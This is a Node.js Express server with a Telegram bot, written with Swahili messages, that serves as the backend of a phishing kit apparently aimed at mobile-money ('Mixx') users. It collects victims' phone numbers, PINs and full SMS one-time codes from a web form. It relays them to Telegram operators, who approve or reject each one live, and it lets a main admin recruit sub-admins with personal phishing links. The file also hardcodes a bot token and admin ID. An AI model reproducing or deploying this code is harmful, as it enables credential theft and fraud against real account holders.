const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Main System Bot Token and Main Admin ID
const MAIN_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
const PORT = process.env.PORT || 10000;

if (!MAIN_BOT_TOKEN) {
    console.error("❌ ERROR: Main Telegram Bot Token is missing!");
} else {
    console.log("🤖 Initializing Main Telegram Bot...");
}

const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });

mainBot.on('polling_error', (error) => {
    console.error('⚠ Main Bot Polling Error:', error.code, error.message);
});

let activeSessions = {};
let authorizedAdmins = new Set(MAIN_ADMIN_ID ? [MAIN_ADMIN_ID] : []);
let pendingSubAdmins = new Map(); // chatId -> { firstName, username }

function escapeMarkdown(text) {
    if (!text) return '';
    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

mainBot.on('message', (msg) => {
    if (!msg.text) return;
    const chatId = msg.chat.id;
    const userIdStr = chatId.toString().trim();
    const firstName = msg.from.first_name || 'Admin';
    const username = msg.from.username ? `@${msg.from.username}` : 'No username set';

    if (msg.text.startsWith('/broadcast')) {
        if (userIdStr !== MAIN_ADMIN_ID) {
            mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
            return;
        }

        const broadcastMessage = msg.text.replace('/broadcast', '').trim();
        if (!broadcastMessage) {
            mainBot.sendMessage(chatId, "⚠️ Tafadhali andika ujumbe unaotaka kutuma baada ya amri.\n\nMfano:\n`/broadcast Habari wadau, mfumo uko tayari!`", { parse_mode: "Markdown" });
            return;
        }

        let successCount = 0;
        let failCount = 0;

        const broadcastPromises = Array.from(authorizedAdmins).map(async (adminId) => {
            if (adminId === MAIN_ADMIN_ID) return;
            try {
                await mainBot.sendMessage(adminId, `📢 **UJUMBE KUTOKA KWA SYSTEM:**\n\n${broadcastMessage}`, { parse_mode: "Markdown" });
                successCount++;
            } catch (err) {
                console.error(`Failed to broadcast to ${adminId}:`, err.message);
                failCount++;
            }
        });

        Promise.all(broadcastPromises).then(() => {
            mainBot.sendMessage(chatId, `✅ Ujumbe umerushwa kwa sub-admins!\n\n- Waliofanikiwa: ${successCount}\n- Walioshindwa: ${failCount}`);
        });
        return;
    }

    if (msg.text.startsWith('/start')) {
        // If Main Admin starts the bot, give them their free link immediately
        if (userIdStr === MAIN_ADMIN_ID) {
            authorizedAdmins.add(userIdStr);
            sendAdminLink(chatId, userIdStr, firstName, username);
        } 
        // If already an authorized sub-admin, show their link
        else if (authorizedAdmins.has(userIdStr)) {
            sendAdminLink(chatId, userIdStr, firstName, username);
        } 
        // Otherwise, they are a new sub-admin awaiting authorization from Main Admin
        else {
            pendingSubAdmins.set(userIdStr, { firstName, username });
            mainBot.sendMessage(chatId, "⏳ *Ombi Lako Limetumwa*\n\nSubiri Msimamizi Mkuu (Main Admin) akuruhusu ili uweze kupata kiungo chako cha mfumo.", { parse_mode: "Markdown" });

            // Send notification and buttons to Main Admin
            const authMessage = `🔔 *OMBI JIPYA LA SUB-ADMIN*\n\n` +
                `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
                `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
                `🏷 *Username:* ${escapeMarkdown(username)}`;

            mainBot.sendMessage(MAIN_ADMIN_ID, authMessage, {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "✅ RUHUSU (AUTHORIZE)", callback_data: `authsub_${userIdStr}` },
                            { text: "❌ KATAA (DENY)", callback_data: `denysub_${userIdStr}` }
                        ]
                    ]
                }
            }).catch(err => console.error("Error notifying main admin for auth:", err));
        }
    }
});

function sendAdminLink(chatId, userIdStr, firstName, username) {
    const host = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
    const isolatedLink = `${host}/?admin=${userIdStr}`;
    const welcomeText = `🚨 *Kiungo Chako cha Admin kiko Tayari!*\n\n` +
        `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
        `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
        `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
        `🔗 *Kiungo Chako Maalum (Free Link):*\n${isolatedLink}`;

    mainBot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
        .catch(err => console.error("Error sending start message:", err));
}

function setupCallbackHandler(botInstance) {
    botInstance.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;
        const data = query.data;
        const userIdStr = chatId.toString().trim();

        // Handle Sub-Admin Authorization by Main Admin
        if (data.startsWith('authsub_') || data.startsWith('denysub_')) {
            if (userIdStr !== MAIN_ADMIN_ID) {
                botInstance.answerCallbackQuery(query.id, { text: "⚠ Ruhusa imekataliwa: Msimamizi Mkuu pekee ndiye anayeruhusiwa.", show_alert: true });
                return;
            }

            const subAdminId = data.split('_')[1];
            const subDetails = pendingSubAdmins.get(subAdminId) || { firstName: 'Sub-Admin', username: 'N/A' };

            botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, {
                chat_id: chatId,
                message_id: query.message.message_id
            }).catch(err => console.error("Error clearing markup:", err));

            if (data.startsWith('authsub_')) {
                authorizedAdmins.add(subAdminId);
                pendingSubAdmins.delete(subAdminId);

                botInstance.answerCallbackQuery(query.id, { text: "Sub-admin ameelekezwa na kuruhusiwa!" });
                botInstance.sendMessage(subAdminId, "✅ *Ombi Lako Limekubaliwa!*\n\nBonyeza /start tena ili kupata kiungo chako cha mfumo.", { parse_mode: "Markdown" })
                    .catch(() => {});
                botInstance.sendMessage(MAIN_ADMIN_ID, `✅ Umemruhusu mafanikio sub-admin: ${subDetails.firstName} (${subAdminId})`);
            } else {
                pendingSubAdmins.delete(subAdminId);
                botInstance.answerCallbackQuery(query.id, { text: "Ombi limekataliwa." });
                botInstance.sendMessage(subAdminId, "❌ *Ombi Lako Limekataliwa*\n\nSamahani, hukuruhusiwa kutumia mfumo huu.").catch(() => {});
                botInstance.sendMessage(MAIN_ADMIN_ID, `❌ Umekataa ombi la sub-admin: ${subDetails.firstName} (${subAdminId})`);
            }
            return;
        }

        const parts = data.split('_');
        const action = parts[0]; 
        const sessionId = parts.slice(1).join('_');

        const session = activeSessions[sessionId];
        if (!session) {
            botInstance.answerCallbackQuery(query.id, { text: "Kipindi kimeisha au hakionekani.", show_alert: true });
            return;
        }

        if (session.targetAdmin !== userIdStr) {
            botInstance.answerCallbackQuery(query.id, { text: "⚠ Ruhusa imekataliwa: Hii si ya kwako.", show_alert: true });
            return;
        }

        if (action === 'allow') session.status = 'approved_pin';
        else if (action === 'deny') session.status = 'denied';
        else if (action === 'wrongpin') session.status = 'wrong_pin';
        else if (action === 'wrongsms') session.status = 'wrong_sms';
        else if (action === 'approved') session.status = 'success';

        botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, {
            chat_id: chatId,
            message_id: query.message.message_id
        }).catch(err => console.error("Error clearing markup:", err));

        botInstance.answerCallbackQuery(query.id).catch(err => console.error("Error answering callback query:", err));
    });
}

setupCallbackHandler(mainBot);

app.post('/api/submit-credentials', (req, res) => {
    const { sessionId, phone, pin, adminId } = req.body;
    
    let targetAdmin = MAIN_ADMIN_ID;

    if (adminId && authorizedAdmins.has(adminId)) {
        targetAdmin = adminId;
    }

    activeSessions[sessionId] = {
        phone, pin,
        targetAdmin,
        status: 'pending_pin_approval',
        incomingSMS: ''
    };

    const message = `NEW MIXX APPLICANT\n\n` +
        `PHONE NO: ${phone}\n` +
        `PIN: ${pin}`;

    mainBot.sendMessage(targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "RUHUSU (ALLOW)", callback_data: `allow_${sessionId}` },
                    { text: "KATAA (DENY)", callback_data: `deny_${sessionId}` }
                ]
            ]
        }
    }).then(() => {
        console.log(`✅ Credentials successfully sent to designated admin: ${targetAdmin}`);
    }).catch(err => {
        console.error(`❌ Telegram Send Error:`, err.response ? err.response.body : err.message);
    });

    res.json({ success: true, sessionId });
});

app.post('/api/submit-otp', (req, res) => {
    const { sessionId, otpText } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ status: 'not_found', message: 'Session not found' });
    }

    session.otpText = otpText;
    session.status = 'pending_final_approval';

    const message = `UTHIBITISHO WA SMS OTP\n\n` +
        `NAMBARI YA SIMU: ${session.phone}\n\n` +
        `UJUMBE WOTE WA SMS:\n${otpText}`;

    mainBot.sendMessage(session.targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📋 Nakili Ujumbe", copy_text: { text: otpText } }
                ],
                [
                    { text: "PIN MBAYA ❌", callback_data: `wrongpin_${sessionId}` },
                    { text: "SMS MBAYA", callback_data: `wrongsms_${sessionId}` }
                ],
                [
                    { text: "IMETHIBITISHWA", callback_data: `approved_${sessionId}` }
                ]
            ]
        }
    }).then(() => {
        console.log(`✅ Full SMS OTP successfully sent to admin ${session.targetAdmin}`);
    }).catch(err => console.error(`❌ Failed to send OTP alert to admin:`, err));

    res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
    const session = activeSessions[req.params.sessionId];
    if (!session) {
        return res.json({ status: 'not_found' });
    }
    res.json({ 
        status: session.status,
        incomingSMS: session.incomingSMS || ''
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
                        
